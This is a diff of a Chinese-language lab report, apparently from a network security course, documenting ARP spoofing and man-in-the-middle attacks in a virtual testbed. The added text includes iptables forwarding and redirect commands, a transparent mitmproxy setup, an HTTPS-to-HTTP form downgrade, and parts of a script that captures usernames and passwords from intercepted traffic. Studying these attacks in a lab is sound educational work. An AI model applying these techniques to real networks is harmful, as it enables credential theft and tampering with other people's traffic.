@@ -17,7 +17,13 @@
 
 ### 虚拟机环境
 
-为了方便编写、测试和验证攻击脚本，我们使用VMware ESXi配置了虚拟机环境。虚拟机中有三台主机，分别为：网关`nsl-gateway`、攻击者`nsl-attacker`以及受害者`nsl-victim`。它们通过虚拟适配器接入虚拟交换机，实验中我们确保虚拟适配器和虚拟交换机的配置与真实网卡和交换机的配置尽量一致。
+为了方便编写、测试和验证攻击脚本，我们使用VMware ESXi配置了虚拟机环境。虚拟机中有三台主机，分别为：网关 `nsl-gateway` 、攻击者 `nsl-attacker` 以及受害者 `nsl-victim` 。它们通过虚拟适配器接入虚拟交换机，实验中我们确保虚拟适配器和虚拟交换机的配置与真实网卡和交换机的配置尽量一致。
+
+| 名称    | MAC               | IP                |
+| ------- | ----------------- | ----------------- |
+| Gateway | 00:50:56:b1:16:1b | 10.1.1.1/24       |
+| Victim  | 00:50:56:b1:17:36 | 10.1.1.2/24       |
+| Attacker| 00:50:56:b1:f9:0a | 10.1.1.3/24       |
 
 ### 真实环境
 
@@ -29,34 +35,54 @@
 
 ### 双向ARP欺骗
 
-TODO
+双向 ARP 欺骗顾名思义有两个途径，即无论在受害者询问网关物理地址，还是反过来时，都同时对二者进行 ARP 欺骗。为了使欺骗总是能够覆盖正确的回复，所以每次发出的攻击ARP包都是连续的三个。同时，攻击者还定期发送“无偿 ARP”（Gratuitous ARP），向广播域内所有主机告知自己是网关，保证自己的欺骗条目始终存在于各主机的ARP表项中。详细的攻击脚本请见最后的附录。
 
-即修改`sysctl.conf`，加入如下配置：
+由于进行欺骗后，攻击者事实上成为了受害者和网关间的一个“透明网关”，所以需要打开 Linux 的包转发功能，即执行：
 
+```bash
+echo 1 > /proc/sys/net/ipv4/conf/all/ip_forward
+iptables -A FORWARD -j ACCEPT
 ```
-net.ipv4.ip_forward=1
-```
+
+此时，如果真实网关和受害者都没有任何防护的话，我们能够看到两者的ARP表中的项目已经被污染，并且受害者和网关相互通信的流量都经过了攻击者。下图即为它们的 ARP 表：
+
+![受害者的ARP表](images/victim_arp_table_spoofed.png)
+
+![网关的ARP表](images/gateway_arp_table_spoofed.png)
+
+而在受害者 ping 网关，可以在攻击者的网卡上捕获到双向的流量，这也说明攻击是成功的。
+
+![欺骗后的icmp流量](images/icmp_after_spoofing.png)
+
+当受害者以传统 FTP 协议（明文）访问一台服务器时，其输入的用户名密码也被攻击者成功捕获了：
+
+![捕获的ftp会话](images/ftp_user_and_password.png)
+
+同样地，我们也可以捕获受害者所有的HTTP流量。但是现在只剩下极少的网站使用纯HTTP，校内的大部分信息站点虽然默认是HTTP服务，但表单提交都是HTTPS地址，因此不能直接通过流量捕获获得用户的凭据。因此，我们需要使用中间人攻击的手段。
 
 ### 中间人攻击
 
-TODO
-
-使用如下命令配置iptables：
+首先，保持 ARP 欺骗脚本的运行。然后使用如下命令配置iptables：
 
 ```bash
-iptables -A FORWARD -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
 ```
 
-首先允许转发，然后通过目标地址NAT，将所有HTTP流量（一般是80端口的流量）转发到本机的mitmproxy，以便进行下一步攻击。
+这通过目标地址NAT，将所有HTTP流量（一般是80端口的流量）转发到本机的 mitmproxy，以便进行下一步攻击。
 
-接下来运行mitmproxy即可看到受害者的每一个HTTP会话，如图所示。
+接下来运行 `mitmproxy --mode transparent` 即可看到受害者的每一个HTTP会话，如图所示。
 
-TODO: mitmproxy的图
+![mitmproxy透明代理](images/mitm_proxy_transparent.png)
 
 通过撰写脚本（请见附录2），可以自动化地抓取HTTP请求中的用户名和密码，以及修改HTTP响应的内容。
 
-本实验修改了HTTP响应中的图片内容，将彩色的图片转换为纯黑白点阵图片，如下图所示。
+其中重要的步骤是所谓的“降级攻击”，即将网页中表单的 target 更改为 HTTP 协议，这样就能从请求中抓取用户名和密码数据。
+
+除了降级攻击之外，本实验还添加了一个名为 `x-twd2-message` 的 HTTP 头，指示网页已经被篡改了：
+
+![add_header](images/add_header.png)
+
+并且，我们还修改了HTTP响应中的图片内容，将彩色的图片转换为纯黑白点阵图片，如下面几张图所示：
 
 ![learn](images/learn.png)
 
@@ -207,9 +233,10 @@ class Trans:
         m = regex.search(flow.request.text)
         if not m:
           continue
-        print(name)
-        print('  Username: ', urllib.parse.unquote_plus(m.group('username')))
-        print('  Password: ', urllib.parse.unquote_plus(m.group('password')))
+        print('Credential captured from {}:\n\tUsername: {}\n\tPassword: {}'
+                .format(name,
+                        urllib.parse.unquote_plus(m.group('username')),
+                        urllib.parse.unquote_plus(m.group('password'))))
     except Exception as e:
       pass
 
@@ -227,7 +254,7 @@ class Trans:
       stream = io.BytesIO()
       img.save(stream, format='PNG')
       flow.response.content = stream.getvalue()
-      print('image!')
+      print('Image converted: {}'.format(flow.request.path))
     except Exception as e:
       repr(e)
 
@@ -240,5 +267,5 @@ addons = [
 使用方法：
 
 ```bash
-mitmdump --mode transparent --showhost -s trans.py -q
+sudo mitmdump --mode transparent --showhost -s trans.py -q
 ```
